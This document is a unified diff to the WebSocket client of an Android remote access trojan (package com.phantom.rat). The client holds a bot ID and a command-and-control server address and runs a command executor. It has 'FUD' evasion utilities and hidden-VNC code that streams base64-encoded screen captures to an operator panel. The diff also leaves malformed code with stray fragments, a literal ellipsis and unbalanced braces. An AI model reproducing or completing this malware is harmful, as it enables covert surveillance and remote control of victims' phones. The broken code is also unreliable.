@@ -1,51 +1,4 @@
-package com.phantom.rat;
 
-import android.content.Context;
-import android.content.Intent;
-import android.content.IntentFilter;
-import android.os.Build;
-
-import org.json.JSONArray;
-import org.json.JSONObject;
-
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.nio.charset.StandardCharsets;
-import java.time.Duration;
-import java.util.Locale;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.Response;
-import okhttp3.WebSocket;
-import okhttp3.WebSocketListener;
-
-public class WebSocketClient {
-    private final Context ctx;
-    private final String botId;
-    private final String server;
-    private final ExecutorService exec = Executors.newSingleThreadExecutor();
-    private final CommandExecutor executor;
-    private OkHttpClient http;
-    private WebSocket ws;
-    private volatile boolean alive;
-    private volatile boolean running = true;
-
-    public WebSocketClient(Context ctx) {
-        this.ctx = ctx.getApplicationContext();
-        this.botId = FudUtils.botId(this.ctx);
-        String srv = FudUtils.config(this.ctx, "server", "http://127.0.0.1:32766");
-        this.server = srv.endsWith("/") ? srv.substring(0, srv.length() - 1) : srv;
-        this.http = new OkHttpClient.Builder().pingInterval(Duration.ofSeconds(20)).build();
-        this.executor = new CommandExecutor(this.ctx, this);
-    }
-
-    public boolean isAlive() { return alive; }
 
     public void connect() {
         String wsUrl = server.replace("https://", "wss://").replace("http://", "ws://") + "/ws";
@@ -125,6 +78,17 @@ public class WebSocketClient {
             return true;
         }
         return false;
+    }
+
+    /** Raw JSON over WS (HVNC meta / frames). */
+    public void sendJsonText(String json) {
+        if (ws != null && alive) ws.send(json);
+    }
+
+    /** HVNC frame relay — JPEG → base64 → WS (relayed to operator panel by server). */
+    public void sendFrame(byte[] jpeg) {
+        String b64 = android.util.Base64.encodeToString(jpeg, android.util.Base64.NO_WRAP);
+        sendJsonText("{\"type\":\"frame\",\"botId\":\"" + botId + "\",\"data\":\"" + b64 + "\"}");
     }
 
     public void sendResult(long cmdId, boolean ok, String data) {
@@ -308,23 +272,7 @@ public class WebSocketClient {
 
     public void close() {
         running = false;
+        if (instance == this) instance = null;
         if (ws != null) ws.close(1000, null);
-
-        public void sendJsonText(String json) { ws.send(json); }
-
-public void sendFrame(byte[] jpeg) {
-    String b64 = android.util.Base64.encodeToString(jpeg, android.util.Base64.NO_WRAP);
-    sendJsonText("{\"type\":\"frame\",\"botId\":\"" + botId + "\",\"data\":\"" + b64 + "\"}");
-
-
-    private static volatile WebSocketClient instance;
-
-public WebSocketClient(Context ctx) {
-    ...
-    instance = this;
-}
-
-public static WebSocketClient getInstance() { return instance; }
-}
     }
-}
+            }
